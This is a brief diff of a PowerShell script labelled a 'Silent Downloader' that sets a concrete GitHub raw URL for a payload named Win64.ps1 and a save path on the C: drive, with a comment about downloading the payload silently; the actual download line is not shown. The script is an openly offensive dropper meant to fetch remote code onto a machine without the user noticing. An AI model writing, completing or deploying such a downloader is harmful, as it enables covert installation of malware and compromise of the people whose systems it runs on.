@@ -1,5 +1,5 @@
 # Silent Downloader - Saves payload to C: drive
-$payloadUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/Win64.ps1"
+$payloadUrl = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/refs/heads/main/Win64.ps1"
 $savePath = "C:\Win64.ps1"
 
 # Download the payload silently
